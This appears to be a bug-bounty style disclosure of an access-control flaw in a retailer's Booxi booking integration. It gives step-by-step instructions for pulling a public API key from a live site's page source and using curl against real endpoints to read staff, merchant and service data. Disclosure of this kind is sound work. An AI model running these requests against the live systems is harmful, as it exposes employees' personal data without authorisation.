## Use case

The vulnerability in Decathlon's Booxi integration allows unauthenticated users to access sensitive internal data, including staff information and booking details, due to improper access control on the public Merchant API key.

## Steps to test

1. Navigate to https://www.decathlon.be/fr/help/app/ask_store/store_code/ and view the page source.
2. Search for 'storeApikeys' and save one of the API keys for testing.
3. Open a command line interface and execute the following curl command to access merchant data: curl -X GET 'https://api.booxi.eu/booking/v1/merchant' -H 'Booxi-APIKey: <your_api_key>'.
4. Execute the curl command for staff data: curl -X GET 'https://api.booxi.eu/booking/v1/staff' -H 'Booxi-APIKey: <your_api_key>'.
5. Execute the curl command for service data: curl -X GET 'https://api.booxi.eu/booking/v1/service' -H 'Booxi-APIKey: <your_api_key>'.
6. Execute the curl command for service category data: curl -X GET 'https://api.booxi.eu/booking/v1/serviceCategory' -H 'Booxi-APIKey: <your_api_key>'.
